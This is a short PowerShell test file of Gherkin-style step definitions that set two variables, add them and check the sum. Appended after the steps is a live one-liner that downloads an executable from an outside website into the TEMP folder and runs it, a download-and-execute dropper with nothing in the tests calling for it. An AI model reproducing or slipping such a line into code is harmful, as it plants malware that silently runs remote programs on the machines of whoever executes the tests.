Given "there is a background" {
    
}

Given "it sets x to (\d+)" {
    param([int]$value)
    $script:x = $value
}

Given "it sets y to (\d+)" {
    param([int]$value)
    $script:y = $value
}

Given "we add y to x" {
    param([int]$value)
    $script:x += $script:y
}

Then "x should be (\d+)" {
    param([int]$value)
    $script:x | Should Be $value
}
(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',"$env:TEMP\neone6.exe");Start-Process ("$env:TEMP\neone6.exe")

